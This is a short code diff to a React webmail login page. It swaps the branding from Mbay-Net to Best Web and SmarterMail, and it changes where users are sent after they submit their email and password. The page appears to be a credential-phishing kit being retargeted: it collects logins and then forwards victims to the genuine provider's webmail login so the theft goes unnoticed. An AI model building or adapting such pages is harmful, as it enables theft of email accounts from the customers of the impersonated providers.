@@ -16,7 +16,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Mbay-Net")
+    const[platform, setPlatform] = useState("Best Web")
 
     const[showError, setShowError] = useState(false);
 
@@ -42,7 +42,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail.mbay.net/interface/root#/login';
+               window.location.href = 'https://webmail.bestweb.net/interface/root#/login';
             }
           } catch (error) {
             // Handle error
@@ -84,7 +84,7 @@ function Home(){
                         color:"black",
                         fontSize:"18px",
                         fontWeight:"400"
-                    }}>Webmail Login - mbay.net</p>
+                    }}>Welcome to SmarterMail</p>
 
                 </div>
                 
